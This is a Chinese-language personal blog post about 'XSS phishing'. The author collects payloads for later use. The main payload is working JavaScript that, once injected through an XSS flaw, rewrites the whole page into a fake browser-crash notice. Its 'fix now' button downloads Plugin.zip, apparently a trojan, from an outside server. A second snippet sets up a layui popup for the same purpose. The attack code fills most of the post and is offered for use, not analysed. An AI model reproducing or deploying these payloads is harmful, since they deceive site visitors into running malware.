<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>XSS钓鱼 | Hurn's Blog</title><meta name="description" content="XSS钓鱼 - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">XSS钓鱼</h1><div class="post-info"><a></a>2021-10-12</div><div class="post-content"><p>整理下payload，可能会用得上，具体原理可以看我<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263612.html">之前freebuf上写过的一篇文章</a>，其实很简单，在有XSS漏洞之后可以注入JS完全重写整个html页面，用来诱惑对方下载执行木马。</p>
<p>POC1:</p>
<pre><code class="javascript">        var body = document.body;
    var _left =  window.innerWidth * 0.3 + &#39;px&#39;;
    var _top = window.innerHeight * 0.3 + &#39;px&#39;;
    var _height = window.innerHeight
    body.innerHTML=`&lt;div style=&quot;background-color: white;height: $&#123;_height&#125;px&quot;&gt;&lt;div style=&#39;position:absolute;top:$&#123;_top&#125;;left:$&#123;_left&#125;;height:300px;width:600px;&#39;&gt;&lt;img src=&#39;http://39.*.*.*/sdp.png&#39; style=&#39;margin:3px;&#39;&gt;
          &lt;p&gt;&lt;h3 &gt;喔唷，崩溃啦!&lt;/h3&gt;&lt;/p &gt;
          &lt;p style=&#39;color:gray&#39;&gt;显示此网页时出了点问题，请在您的页面上启用显示插件，从而可能会有所帮助。&lt;/br&gt;&lt;/p &gt;
          &lt;a href=&#39;http://*.*.*.*/Plugin.zip&#39;&gt;
          &lt;button style=&#39;margin-left:85%;height:30px;line-hight:30px;outline:none;border:none;background-color:rgb(26,115,232);color:white&#39;  &gt;立即修复&lt;/button&gt;&lt;/a&gt;
        &lt;/div&gt;&lt;/div&gt;
</code></pre>
<p>POC2:</p>
<pre><code class="javascript">layui.use(&#39;layer&#39;, function() &#123;
      var layer = layui.layer //弹层
      layer.open(&#123;
          type: 1,
          skin: &#39;layui-layer-rim&#39;, //加上边框
          area: [&#39;420px&#39;, &#39;240px&#39;], //宽高
          content: &#39;html内容&#39;
        &#125;);
&#125;);
</code></pre>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2021/10/20/PE%E8%A7%A3%E6%9E%90%20d3e34c1835e14c429ee03918de3a32ce/">prev</a><a class="next" href="/2021/09/05/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>